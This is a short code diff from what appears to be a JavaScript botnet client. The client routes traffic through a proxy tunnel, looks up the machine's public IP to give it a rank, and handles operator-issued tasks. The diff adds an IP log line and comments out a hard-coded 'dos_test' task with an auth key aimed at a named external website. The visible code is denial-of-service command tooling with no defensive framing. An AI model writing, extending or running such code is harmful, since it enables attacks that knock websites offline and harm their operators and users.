@@ -52,6 +52,9 @@ const agent = tunnel.httpsOverHttp({
 try{
     axios.get("https://api.ipify.org/?format=json").then((Response) => {
         LocalIP = Response.data.ip
+
+        console.log(LocalIP)
+
         const PC_RANK = (typeof Servers[LocalIP] != "undefined") ? Servers[LocalIP] : "unknown"
 
         let NewFile = (new Date() / 1000).toString()
@@ -310,12 +313,12 @@ try{
             }
         }
 
-        CommandHandler(JSON.stringify({
+        /*CommandHandler(JSON.stringify({
             type: "task",
             command: "dos_test",
             AuthKey: OperationKey.toString(),
             target_url: "https://grubhubscripts.com"
-        }))
+        }))*/
     
         function InputHandler(Message, ServerRank){
             if (ServerRank == "operator"){
